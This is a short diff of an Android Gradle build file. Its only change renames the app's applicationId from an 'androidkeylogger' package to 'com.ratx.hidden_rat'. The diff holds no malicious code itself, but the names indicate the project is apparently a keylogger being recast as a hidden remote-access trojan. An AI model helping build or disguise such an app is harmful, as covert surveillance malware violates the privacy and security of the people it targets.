@@ -9,7 +9,7 @@ android {
     compileSdk 33
 
     defaultConfig {
-        applicationId "com.azamovhudstc.androidkeylogger"
+        applicationId "com.ratx.hidden_rat"
         minSdk 23
         targetSdk 33
         versionCode 1
